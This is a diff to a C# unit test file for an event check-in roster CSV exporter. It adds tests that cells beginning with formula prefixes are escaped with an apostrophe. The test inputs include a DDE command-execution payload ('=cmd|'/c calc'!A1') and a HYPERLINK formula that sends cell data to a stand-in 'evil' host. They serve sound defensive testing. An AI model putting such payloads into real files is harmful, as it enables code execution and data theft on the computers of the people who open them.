@@ -15,8 +15,12 @@ public sealed class EventCheckInRosterCsvExporterTests
 {
     // Post-review D-S1-1: QrCodeToken column removed from the CSV (paper-roster credential
     // leak vector). The token remains on the in-app DTO for the authenticated scanner UI.
+    // Round-3 R3-DN-6 + R3-L-S1-1: header column renamed from "[ ] (Anwesenheit)" to "Present"
+    // — DN-6 picked option (b) (full English), and L-S1-1 dropped the literal "[ ]" which
+    // some Excel locales mis-parse as part of a name-range expression. The cell value below
+    // remains empty so paper-roster staff can tick by hand.
     private const string ExpectedHeader =
-        "#,Name,Guests,Status,Waitlisted,CheckedIn,CheckedInAt,SpecialRequirements,[ ] (Anwesenheit)";
+        "#,Name,Guests,Status,Waitlisted,CheckedIn,CheckedInAt,SpecialRequirements,Present";
 
     [Fact]
     public void Export_StartsWithUtf8Bom()
@@ -96,7 +100,7 @@ public sealed class EventCheckInRosterCsvExporterTests
     }
 
     [Fact]
-    public void Export_LastColumnIsEmptyAnwesenheitCell()
+    public void Export_LastColumnPresent_IsEmptyAfterCsvParse()
     {
         var exporter = new EventCheckInRosterCsvExporter();
 
@@ -105,6 +109,71 @@ public sealed class EventCheckInRosterCsvExporterTests
 
         rows[1].Last().Should().BeEmpty();
         rows[2].Last().Should().BeEmpty();
+    }
+
+    [Fact]
+    public void Export_LastColumnPresent_IsQuotedEmptyInRawBytes()
+    {
+        // Round-3 R3-M-S1-1: the data-row's last cell (tick-box) is empty. Some Excel locales
+        // collapse a trailing empty cell after the final comma, which would silently drop the
+        // tick-box column from the rendered row. Emitting the cell as `""` (quoted empty)
+        // survives that pass while still parsing back to an empty string in any RFC-4180 reader.
+        var exporter = new EventCheckInRosterCsvExporter();
+
+        var text = DecodeUtf8WithoutBom(exporter.Export(BuildRoster(BuildItem("Anna"))));
+        var lines = text.Split("\r\n", StringSplitOptions.None);
+
+        lines[1].Should().EndWith(",\"\"");
+    }
+
+    [Theory]
+    [InlineData("=cmd|'/c calc'!A1")]      // OWASP classic: Excel/Sheets formula
+    [InlineData("+1+1")]                    // leading + also evaluates
+    [InlineData("-1+SUM(A1:A10)")]         // leading - also evaluates
+    [InlineData("@SUM(A1:A10)")]            // legacy Lotus 1-2-3 + Excel formula prefix
+    public void Export_FormulaInjectionPrefixes_AreEscapedWithLeadingApostrophe(string maliciousName)
+    {
+        // Round-3 R3-C1 (Critical): ParticipantName and SpecialRequirements are populated from
+        // the public registration form. A hostile registrant who submits "=cmd|'/c calc'!A1"
+        // as their name would otherwise have it executed on staff workstations the moment the
+        // CSV is opened in Excel. OWASP-recommended fix: prefix any cell whose first character
+        // is in {=,+,-,@} with a literal apostrophe (Excel's literal-string indicator) AND
+        // force-quote so the prefix survives parser round-trips.
+        var exporter = new EventCheckInRosterCsvExporter();
+
+        var text = DecodeUtf8WithoutBom(exporter.Export(BuildRoster(BuildItem(maliciousName))));
+        var rows = ParseCsv(text);
+
+        // After RFC-4180 parse, the cell contains the apostrophe-prefixed value verbatim.
+        // The raw byte sequence emits the apostrophe + quotes around the whole cell.
+        rows[1][1].Should().Be("'" + maliciousName);
+        text.Should().Contain($"\"'{maliciousName}\"");
+    }
+
+    [Fact]
+    public void Export_FormulaInjectionInSpecialRequirements_IsEscaped()
+    {
+        // Round-3 R3-C1: SpecialRequirements is free-text from the public registration form —
+        // same threat surface as ParticipantName.
+        var exporter = new EventCheckInRosterCsvExporter();
+        var injected = BuildItem("Anna", specialRequirements: "=HYPERLINK(\"http://evil/?c=\"&A1)");
+
+        var rows = ParseCsv(DecodeUtf8WithoutBom(exporter.Export(BuildRoster(injected))));
+
+        rows[1][7].Should().StartWith("'=HYPERLINK");
+    }
+
+    [Theory]
+    [InlineData("Anna")]                    // benign name
+    [InlineData("Müller")]                  // benign Umlaut
+    [InlineData("'Already-quoted")]         // apostrophe is harmless and NOT a formula prefix
+    public void Export_BenignNamesAreNotApostrophePrefixed(string benignName)
+    {
+        var exporter = new EventCheckInRosterCsvExporter();
+
+        var rows = ParseCsv(DecodeUtf8WithoutBom(exporter.Export(BuildRoster(BuildItem(benignName)))));
+
+        rows[1][1].Should().Be(benignName);
     }
 
     [Fact]
